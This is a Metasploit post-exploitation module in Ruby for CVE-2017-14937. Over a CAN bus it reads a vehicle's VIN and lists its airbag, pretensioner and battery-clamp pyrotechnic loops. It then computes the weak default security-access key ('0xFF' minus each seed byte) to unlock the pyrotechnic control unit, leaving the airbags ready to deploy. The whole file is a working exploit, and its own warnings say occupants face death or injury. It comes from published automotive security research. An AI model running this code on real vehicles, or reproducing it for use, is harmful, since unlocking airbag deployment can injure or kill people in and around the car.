##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core/post/hardware/automotive/uds'

class MetasploitModule < Msf::Post

  include Msf::Post::Hardware::Automotive::UDS
  include Msf::Post::Hardware::Automotive::DTC

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Check For and Prep the Pyrotechnic Devices (Airbags, Battery Clamps, etc.)',
        'Description'   => %q{ Acting in the role of a Pyrotechnical Device Deployment Tool (PDT), this module
                               will first query all Pyrotechnic Control Units (PCUs) in the target vehicle
                               to discover how many pyrotechnic devices are present, then attempt to validate
                               the security access token using the default simplified algorithm.  On success,
                               the vehicle will be in a state that is prepped to deploy its pyrotechnic devices
                               (e.g. airbags, battery clamps, etc.) via the service routine. (ISO 26021) },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Johannes Braun',    # original research
          'Juergen Duerrwang', # original research
          'Craig Smith'        # research and module author
        ],
        'References'    =>
          [
            [ 'CVE', '2017-14937' ],
            [ 'URL', 'https://www.researchgate.net/publication/321183727_Security_Evaluation_of_an_Airbag-ECU_by_Reusing_Threat_Modeling_Artefacts' ]
          ],
        'Platform'      => ['hardware'],
        'SessionTypes'  => ['hwbridge']
      ))
    register_options([
      OptInt.new('SRCID', [true, 'Module ID to query', 0x7f1]),
      OptInt.new('DSTID', [false, 'Expected reponse ID, defaults to SRCID + 8', 0x7f9]),
      OptInt.new('PADDING', [false, 'Pad the packet with extra bytes to always be 8 bytes long', 0x00]),
      OptString.new('CANBUS', [false, 'CAN Bus to perform scan on, defaults to connected bus', nil])
    ])
  end

  LOOP_TABLE = {
    0x00 => 'ISOSAEReserved',
    0x01 => 'airbag driver side frontal 1st stage',
    0x02 => 'airbag left side frontal 1st stage',
    0x03 => 'airbag right side frontal 1st stage',
    0x04 => 'airbag driver side frontal 2nd stage',
    0x05 => 'airbag left side frontal 2nd stage',
    0x06 => 'airbag right side frontal 2nd stage',
    0x07 => 'airbag driver side frontal 3rd stage',
    0x08 => 'airbag left side frontal 3rd stage',
    0x09 => 'airbag right side frontal 3rd stage',
    0x0A => 'airbag passenger side frontal 1st stage',
    0x0B => 'airbag passenger side frontal 2nd stage',
    0x0C => 'airbag passenger side frontal 3rd stage',
    0x0D => 'airbag left side frontal 3rd stage',
    0x0E => 'airbag right side frontal 3rd stage',
    0x0F => 'airbag passenger frontal 1st stage - center',
    0x10 => 'airbag passenger frontal 2nd stage - center',
    0x11 => 'airbag passenger frontal 3rd stage - center',
    0x12 => '1st pretensioner driver side',
    0x13 => '1st pretensioner left side',
    0x14 => '1st pretensioner right side',
    0x15 => '2nd pretensioner driver side',
    0x16 => '2nd pretensioner left side',
    0x17 => '2nd pretensioner right side',
    0x18 => '1st pretensioner passenger side',
    0x19 => '2nd pretensioner passenger side',
    0x1A => '1st pretensioner passenger - center',
    0x1B => '2nd pretensioner passenger - center',
    0x1C => '1st pretensioner (2nd row) left',
    0x1D => '2nd pretensioner (2nd row) left',
    0x1E => '1st pretensioner (2nd row) right',
    0x1F => '2nd pretensioner (2nd row) right',
    0x20 => '1st pretensioner (2nd row) center',
    0x21 => '2nd pretensioner (2nd row) center',
    0x22 => '1st pretensioner (3rd row) left',
    0x23 => '2nd pretensioner (3rd row) left',
    0x24 => '1st pretensioner (3rd row) right',
    0x25 => '2nd pretensioner (3rd row) right',
    0x26 => '1st pretensioner (3rd row) center',
    0x27 => '2nd pretensioner (3rd row) center',
    0x28 => 'belt force limiter driver side',
    0x29 => 'belt force limiter left side',
    0x2A => 'belt force limiter right side',
    0x2B => 'belt force limiter passenger side',
    0x2C => 'belt force limiter passenger side - center',
    0x2D => 'belt force limiter 2nd row - left',
    0x2E => 'belt force limiter 2nd row - right',
    0x2F => 'belt force limiter 2nd row - center',
    0x30 => 'belt force limiter 3rd row - left',
    0x31 => 'belt force limiter 3rd row - right',
    0x32 => 'belt force limiter 3rd row - center',
    0x33 => 'headbag - driver side (roof mounted)',
    0x34 => 'headbag - passenger side (roof mounted)',
    0x35 => 'headbag - right side (roof mounted)',
    0x36 => 'headbag - left side (roof mounted)',
    0x37 => 'headbag - 2nd row - left (roof mounted)',
    0x38 => 'headbag - 2nd row - right (roof mounted)',
    0x39 => 'headbag - 3rd row - left (roof mounted)',
    0x3A => 'headbag - 3rd row - right (roof mounted)',
    0x3B => 'sidebag (curtain) - driver side',
    0x3C => 'sidebag (curtain) - passenger side',
    0x3D => 'sidebag (curtain) - left side',
    0x3E => 'sidebag (curtain) - right side',
    0x3F => 'sidebag (curtain) - 2nd row - left',
    0x40 => 'sidebag (curtain) - 2nd row - right',
    0x41 => 'sidebag (curtain) - 3rd row - left',
    0x42 => 'sidebag (curtain) - 3rd row - right',
    0x43 => 'sidebag - driver side (door mounted)',
    0x44 => 'sidebag - passenger side (door mounted)',
    0x45 => 'sidebag - left side (door mounted)',
    0x46 => 'sidebag - right side (door mounted)',
    0x47 => 'sidebag - 2nd row - left (door mounted)',
    0x48 => 'sidebag - 2nd row - right (door mounted)',
    0x49 => 'sidebag - 3rd row - left (door mounted)',
    0x4A => 'sidebag - 3rd row - right (door mounted)',
    0x4B => 'seatbag (cushion) - driver side (seat mounted)',
    0x4C => 'seatbag (cushion) - passenger side (seat mounted)',
    0x4D => 'seatbag (cushion) - left side (seat mounted)',
    0x4E => 'seatbag (cushion) - right side (seat mounted)',
    0x4F => 'seatbag (cushion) - 2nd row - left (seat mounted)',
    0x50 => 'seatbag (cushion) - 2nd row - right (seat mounted)',
    0x51 => 'seatbag (cushion) - 3rd row - left (seat mounted)',
    0x52 => 'seatbag (cushion) - 3rd row - right (seat mounted)',
    0x53 => 'kneebag - driver side',
    0x54 => 'kneebag - passenger side',
    0x55 => 'kneebag - left side',
    0x56 => 'kneebag - right side',
    0x57 => 'kneebag - passenger side - center',
    0x58 => 'footbag - driver side',
    0x59 => 'footbag - passenger side',
    0x5A => 'footbag - left side',
    0x5B => 'footbag - right side',
    0x5C => 'footbag - passenger side - center',
    0x5E => 'active headrest - driver side',
    0x5F => 'active headrest - passenger side',
    0x60 => 'active headrest - left side',
    0x61 => 'active headrest - right side',
    0x62 => 'active headrest - passenger side - center',
    0x63 => 'active headrest - 2nd row - left',
    0x64 => 'active headrest - 2nd row - right',
    0x65 => 'active headrest - 2nd row - center',
    0x66 => 'active headrest - 3rd row - left',
    0x67 => 'active headrest - 3rd row - right',
    0x68 => 'active headrest - 3rd row - center',
    0x69 => 'battery clamp main battery',
    0x6A => 'battery clamp 2nd battery',
    0x6B => 'battery clamp 3rd battery',
    0x6C => 'battery clamp 4th battery',
    0x6D => 'roof-airbag front',
    0x6E => 'roof-airbag front',
    0x6F => 'bag in belt driver side',
    0x70 => 'bag in belt passenger side',
    0x71 => 'bag in belt left side',
    0x72 => 'bag in belt right side',
    0x73 => 'bag in belt passenger side - center',
    0x74 => 'bag in belt 2nd row - left',
    0x75 => 'bag in belt 2nd row - right',
    0x76 => 'bag in belt 2nd row - center',
    0x77 => 'bag in belt 3rd row - left',
    0x78 => 'bag in belt 3rd row - right',
    0x79 => 'bag in belt 3rd row - center',
    0x7A => 'rollover bar #1',
    0x7B => 'rollover bar #2',
    0x7C => 'rollover bar #3',
    0x7D => 'rollover bar #4',
    0x7E => 'active anti-submarining driver seat',
    0x7F => 'active anti-submarining passenger seat',
    0x80 => 'active anti-submarining left seat',
    0x81 => 'active anti-submarining right seat',
    0x82 => 'active anti-submarining passenger seat - center',
    0x83 => 'active anti-submarining seat 2nd row - left',
    0x84 => 'active anti-submarining seat 2nd row - right',
    0x85 => 'active anti-submarining seat 2nd row - center',
    0x86 => 'active anti-submarining seat 3rd row - left',
    0x87 => 'active anti-submarining seat 3rd row - right',
    0x88 => 'active anti-submarining seat 3rd row - center',
    0x89 => 'pedestrian protection front left hood lifter',
    0x8A => 'pedestrian protection front right hood lifter',
    0x8B => 'pedestrian protection rear left hood lifter',
    0x8C => 'pedestrian protection rear right hood lifter',
    0x8D => 'pedestrian protection a-pillar left',
    0x8E => 'pedestrian protection a-pillar right',
    0x8F => 'pedestrian protection wind screen',
    0x90 => 'pedestrian protection bumper left',
    0x91 => 'pedestrian protection bumper center',
    0x92 => 'pedestrian protection bumper right',
    0x93 => 'active steering column',
    0x94 => 'front screen - emergency release',
    0x95 => 'read window - emergency release'
  }

  ACL_TYPES = {
    0x01 => 'CAN only',
    0x02 => 'ACL Comm Mode 12V',
    0x03 => 'ACL PWM FixedLevel 8V',
    0x04 => 'ACL Comm Mode 24V',
    0x05 => 'ACL PWM UbattLevel 12V',
    0x06 => 'ACL PWM UbattLevel 24V'
  }

  PCU_ADDRESS_FORMAT = {
    0x01 => '11 bit normal addressing',
    0x02 => '11 bit extended addressing',
    0x03 => '11 bit mixed addressing',
    0x04 => '29 bit normal fixed addressing',
    0x05 => '29 bit mixed addressing',
    0x06 => '29 bit unique addressing'
  }

  def print_vin(vin)
    return "" if vin.nil?
    vin.map! { |d| d.hex.chr }
    print_status(" VIN: #{vin.join}")
  end

  def print_loop_table(loopid)
    print_status("Loop info (#{loopid[2].hex} pyrotechnic devices):")
    (3..loopid.size).each do |i|
      if i % 2 == 1
        if loopid[i] && (LOOP_TABLE.key? loopid[i].hex)
          print_status("  #{loopid[i]} | #{LOOP_TABLE[loopid[i].hex]}")
        else
          print_status("  #{loopid[i]} | <<UNKNOWN>>")
        end
      else
        if loopid[i] && loopid[i].hex == 0
          print_status('     |  Deployment Status: Good')
        else
          print_status("     |  Deployment Status: Fail (#{loopid[i]})")
        end
      end
    end
  end

  def run
    opt = {}
    opt['PADDING'] = datastore['PADDING'] unless datastore['PADDING'].nil?
    print_status('Gathering Data...')
    vin = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xF1, 0x90], opt)
    no_of_pcus = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xFA, 0x00], opt)
    no_of_iso_version = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xFA, 0x01], opt)
    address_format = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xFA, 0x02], opt)
    loopid = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xFA, 0x06], opt)
    acl_type_definition = loopid[0]
    acl_type_version = loopid[1]
    no_of_charges = loopid[2]

    print_vin(vin)
    print_loop_table(loopid)
    print_status(" Number of PCUs in vehicle     | #{no_of_pcus[0].hex}")
    print_status(' Info About First PCU')
    print_status(" Address format this PCU(s)    | #{PCU_ADDRESS_FORMAT[address_format[0].hex]}")
    print_status(" Number of pyrotechnic charges | #{no_of_charges.hex}")
    print_status(" Version of ISO26021 standard  | #{no_of_iso_version[0].hex}")
    print_status(" ACL type                      | #{ACL_TYPES[acl_type_definition.hex]}")
    print_status(" ACL Type version              | #{acl_type_version.hex}")
    print_status
    print_status('Switching to Diagnostic Session 0x04...')
    resp = set_dsc(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], 0x04, opt)
    if resp.key? 'error'
      print_error("Could not switch to DSC 0x04: #{resp['error']}")
      return
    end
    # We may not need tester present at all because we will perform the action quickly
    send_tester_present(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], opt)
    print_status('Getting Security Access Seed...')
    seed = get_security_token(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], 0x5F, opt)
    if seed.key? 'error'
       print_error("Couldn't get seed: #{seed['error']}")
       return
    end
    print_status("Success.  Seed: #{seed['SEED']}")
    print_status('Attempting to unlock device...')
    display_warning = false
    if seed['SEED'][0].hex == 0 && seed['SEED'][1].hex == 0
      print_status('Security Access Already Unlocked!!')
      display_warning = true
    else
      key = [0xFF - seed['SEED'][0].hex, 0xFF - seed['SEED'][1].hex]
      resp = send_security_token_response(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], key, 0x60, opt)
      if (resp.key? 'error') && !(resp['error'].key? 'RCRRP')
        print_error("Invalid SA Response.  System not vulnerable. Error: #{resp['error']}")
        return
      end
      found_valid = false
      if (resp.key? 'Packets') && resp['Packets'].size > 0
        resp['Packets'].each do |i|
          found_valid = true if (i.key? 'DATA') && i['DATA'].size > 1 && i['DATA'][1] == '67'
        end
      end
      if found_valid
        print_status('Success!')
        display_warning = true
      else
        print_error("Unknown response: #{resp.inspect}")
      end
    end
    if display_warning
      print_warning('Warning! You are now able to start the deployment of airbags in this vehicle')
      print_warning('*** OCCUPANTS OF THE VEHICLE FACE POTENTIAL DEATH OR INJURY ***')
    end
  end

end
